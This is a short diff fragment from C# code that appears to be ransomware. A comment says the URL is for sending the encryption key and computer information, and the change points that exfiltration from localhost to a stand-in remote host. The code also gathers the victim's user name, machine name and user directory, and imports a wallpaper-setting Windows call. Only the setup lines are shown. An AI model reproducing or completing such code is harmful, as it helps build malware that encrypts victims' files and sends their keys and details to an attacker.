@@ -24,7 +24,7 @@ namespace Gendarmerie_B.V._3
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
         private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
         //Url to send encryption key and computer info
-        string targetURL = "http://localhost/Server/write.php";
+        string targetURL = "http://exemple.com/Server/write.php";
         string userName = Environment.UserName;
         string computerName = System.Environment.MachineName.ToString();
         string userDir = "C:\\Users\\";
